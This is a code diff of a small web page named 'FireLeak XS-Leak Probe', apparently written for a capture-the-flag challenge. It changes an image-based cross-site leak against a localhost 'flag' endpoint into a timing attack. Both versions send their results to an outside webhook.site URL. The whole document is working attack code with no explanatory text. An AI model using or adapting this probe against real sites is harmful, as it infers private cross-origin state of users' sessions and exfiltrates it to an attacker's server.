@@ -1,27 +1,15 @@
-<!doctype html>
-<html>
-<body>
-<h1>FireLeak XS-Leak Probe</h1>
-
 <script>
+async function measureLoadTime() {
+  const start = performance.now();
 
-function leakViaImage() {
   const img = new Image();
+  img.src = "http://127.0.0.1/flag?cachebust=" + Math.random();
 
-  img.onload = () => {
-    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?img=loaded");
+  img.onload = img.onerror = () => {
+    const duration = performance.now() - start;
+    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?time=" + duration);
   };
-
-  img.onerror = () => {
-    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?img=error");
-  };
-
-  img.src = "http://127.0.0.1/flag";
 }
 
-leakViaImage();
-
+measureLoadTime();
 </script>
-
-</body>
-</html>
